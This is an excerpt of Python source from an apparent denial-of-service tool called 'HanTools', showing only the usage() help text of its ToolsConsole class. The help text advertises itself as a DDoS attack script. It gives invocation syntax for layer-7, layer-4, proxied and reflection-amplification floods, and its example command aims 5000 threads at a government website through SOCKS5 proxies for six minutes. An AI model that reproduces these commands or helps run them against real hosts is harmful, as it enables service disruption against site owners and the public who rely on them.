...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* HanTools - DDoS Attack Script With %d Methods\n'
                  ...
                  '\n'
                  'Example:\n'
                  '   L7: python start.py get https://www.bekasikota.go.id/ 0 5000 socks5.txt 5000 360\n'
                  '   L7: python %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
